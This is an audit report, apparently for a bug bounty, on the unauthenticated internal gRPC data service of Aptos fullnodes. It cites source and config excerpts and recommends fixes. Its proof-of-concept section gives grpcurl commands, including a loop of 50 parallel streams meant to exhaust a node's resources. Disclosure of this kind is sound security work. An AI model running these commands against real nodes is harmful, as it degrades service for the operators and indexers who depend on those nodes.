# Audit Report

## Title
Unauthenticated Access to Internal Fullnode Data Service Enables Resource Exhaustion

## Summary
The `get_transactions_from_node()` method in the internal fullnode gRPC service (`aptos.internal.fullnode.v1.FullnodeData`) accepts and processes streaming requests without any authentication or authorization checks. Combined with the default configuration binding to `0.0.0.0:50051`, this allows any network-accessible client to stream unlimited blockchain transaction data, potentially exhausting node resources and bypassing the intended public API gateway controls.

## Finding Description

The `FullnodeDataService` implements the internal fullnode gRPC API without authentication middleware. The service accepts `GetTransactionsFromNodeRequest` messages and immediately begins streaming transaction data from the node's database without verifying the caller's identity or authorization. [1](#0-0) 

The server is instantiated and registered without any authentication interceptor: [2](#0-1) 

The default configuration binds the service to all network interfaces: [3](#0-2) 

And the documentation explicitly recommends this insecure binding: [4](#0-3) 

The service namespace (`aptos.internal.fullnode.v1`) indicates this is intended for internal use only: [5](#0-4) 

In contrast, the public-facing data service infrastructure includes authentication metadata extraction: [6](#0-5) 

**Attack Path:**
1. Attacker discovers fullnode with port 50051 exposed (common in misconfigured deployments following documentation)
2. Attacker connects to `aptos.internal.fullnode.v1.FullnodeData/GetTransactionsFromNode` endpoint
3. Attacker sends `GetTransactionsFromNodeRequest` with `starting_version: 0` and no `transactions_count` (infinite stream)
4. Attacker opens multiple concurrent connections to maximize resource consumption
5. Node resources (CPU, memory, disk I/O, network bandwidth) are exhausted serving unauthorized clients
6. Legitimate indexers experience degraded service or complete unavailability

This violates the **Resource Limits** invariant (#9) and the **Access Control** principle (#8) by allowing unrestricted access to internal infrastructure.

## Impact Explanation

This qualifies as **High Severity** per Aptos bug bounty criteria:
- **"Validator node slowdowns"**: Unlimited streaming from multiple concurrent connections can degrade fullnode performance, impacting validator operations that depend on fullnode data availability
- **"API crashes"**: Resource exhaustion could cause the gRPC service or entire node process to crash or become unresponsive
- **"Significant protocol violations"**: Bypasses the intended public API (RawData service) which should be the controlled entry point for external data access

While blockchain transaction data is inherently public, the architectural separation between internal (`FullnodeData`) and public (`RawData`) services indicates an intended access control model. The lack of authentication on the internal service:
1. Enables resource exhaustion attacks from any network-accessible client
2. Bypasses monitoring, rate limiting, and usage controls that should be enforced at the public API layer
3. Violates defense-in-depth principles by relying solely on network perimeter security
4. Creates operational risk from misconfiguration (documentation encourages `0.0.0.0` binding)

## Likelihood Explanation

**High Likelihood** due to:
1. **Default insecure configuration**: Documentation actively shows binding to all interfaces (`0.0.0.0:50051`)
2. **No authentication barrier**: Zero technical difficulty to exploit - simple gRPC client connection
3. **Common misconfiguration**: Operators following documentation will expose the service without additional firewall rules
4. **Architectural confusion**: The "internal" designation may not be understood as requiring network isolation

Attack requirements:
- Network access to fullnode (common in cloud deployments without proper VPC configuration)
- Basic gRPC client (grpcurl, Python client, etc.)
- No authentication credentials needed
- No special privileges or insider access required

## Recommendation

Implement authentication for the internal fullnode gRPC service using tonic interceptors:

**1. Add authentication configuration:**
```yaml
indexer_grpc:
  enabled: true
  address: 127.0.0.1:50051  # Bind to localhost only by default
  auth_tokens: ["token1", "token2"]  # Whitelist for authorized indexers
```

**2. Implement authentication interceptor:**
Add `with_interceptor()` call in the server initialization to validate auth tokens from request metadata before processing requests.

**3. Update documentation:**
Change default binding recommendation from `0.0.0.0:50051` to `127.0.0.1:50051` and document network security requirements.

**4. Add rate limiting:**
Implement per-client rate limiting on stream creation and data volume even for authenticated clients.

**Alternative:** If this service is truly intended only for internal infrastructure, bind to localhost by default and require explicit configuration override to expose on external interfaces.

## Proof of Concept

```bash
# Prerequisites: Fullnode running with indexer_grpc enabled on default port

# PoC 1: Unauthorized data access
grpcurl -max-msg-sz 10000000 \
  -d '{"starting_version": 0}' \
  -import-path protos/proto \
  -proto aptos/internal/fullnode/v1/fullnode_data.proto \
  -plaintext <FULLNODE_IP>:50051 \
  aptos.internal.fullnode.v1.FullnodeData/GetTransactionsFromNode

# PoC 2: Resource exhaustion (run in parallel from multiple terminals)
for i in {1..50}; do
  grpcurl -max-msg-sz 10000000 \
    -d '{"starting_version": 0}' \
    -import-path protos/proto \
    -proto aptos/internal/fullnode/v1/fullnode_data.proto \
    -plaintext <FULLNODE_IP>:50051 \
    aptos.internal.fullnode.v1.FullnodeData/GetTransactionsFromNode &
done

# Monitor node resource consumption (CPU, memory, network) during attack
# Expected: Significant resource consumption, potential service degradation
```

## Notes

While blockchain transaction data is public by design, the architectural separation between the internal `FullnodeData` service and the public `RawData` service indicates an intended security boundary for operational control. The lack of authentication enables unauthorized resource consumption and bypasses intended access controls, even though the underlying data is not confidential. This represents a High severity issue under the "Validator node slowdowns" and "API crashes" categories of the Aptos bug bounty program.

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/fullnode_data_service.rs (L67-88)
```rust
    async fn get_transactions_from_node(
        &self,
        req: Request<GetTransactionsFromNodeRequest>,
    ) -> Result<Response<Self::GetTransactionsFromNodeStream>, Status> {
        // Gets configs for the stream, partly from the request and partly from the node config
        let r = req.into_inner();
        let starting_version = match r.starting_version {
            Some(version) => version,
            // Live mode unavailable for FullnodeDataService
            // Enable use_data_service_interface in config to use LocalnetDataService instead
            None => return Err(Status::invalid_argument("Starting version must be set")),
        };
        let processor_task_count = self.service_context.processor_task_count;
        let processor_batch_size = self.service_context.processor_batch_size;
        let output_batch_size = self.service_context.output_batch_size;
        let transaction_channel_size = self.service_context.transaction_channel_size;
        let ending_version = if let Some(count) = r.transactions_count {
            starting_version.saturating_add(count)
        } else {
            u64::MAX
        };

```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/runtime.rs (L107-112)
```rust
            false => {
                let svc = FullnodeDataServer::new(server)
                    .send_compressed(CompressionEncoding::Zstd)
                    .accept_compressed(CompressionEncoding::Zstd)
                    .accept_compressed(CompressionEncoding::Gzip);
                tonic_server.add_service(svc)
```

**File:** config/src/config/indexer_grpc_config.rs (L85-100)
```rust
impl Default for IndexerGrpcConfig {
    fn default() -> Self {
        Self {
            enabled: false,
            use_data_service_interface: false,
            address: SocketAddr::V4(SocketAddrV4::new(
                Ipv4Addr::new(0, 0, 0, 0),
                DEFAULT_GRPC_STREAM_PORT,
            )),
            processor_task_count: None,
            processor_batch_size: DEFAULT_PROCESSOR_BATCH_SIZE,
            output_batch_size: DEFAULT_OUTPUT_BATCH_SIZE,
            transaction_channel_size: DEFAULT_TRANSACTION_CHANNEL_SIZE,
            max_transaction_filter_size_bytes: DEFAULT_MAX_TRANSACTION_FILTER_SIZE_BYTES,
        }
    }
```

**File:** ecosystem/indexer-grpc/README.md (L48-53)
```markdown
    indexer_grpc:
      enabled: true
      address: 0.0.0.0:50051
      processor_task_count: 10
      processor_batch_size: 100
      output_batch_size: 100```
```

**File:** protos/proto/aptos/internal/fullnode/v1/fullnode_data.proto (L6-6)
```text
package aptos.internal.fullnode.v1;
```

**File:** ecosystem/indexer-grpc/indexer-grpc-utils/src/constants.rs (L12-17)
```rust
// GRPC request metadata key for the token ID.
pub const GRPC_AUTH_TOKEN_HEADER: &str = "x-aptos-data-authorization";
// GRPC request metadata key for the request name. This is used to identify the
// data destination.
pub const GRPC_REQUEST_NAME_HEADER: &str = "x-aptos-request-name";
pub const GRPC_API_GATEWAY_API_KEY_HEADER: &str = "authorization";
```
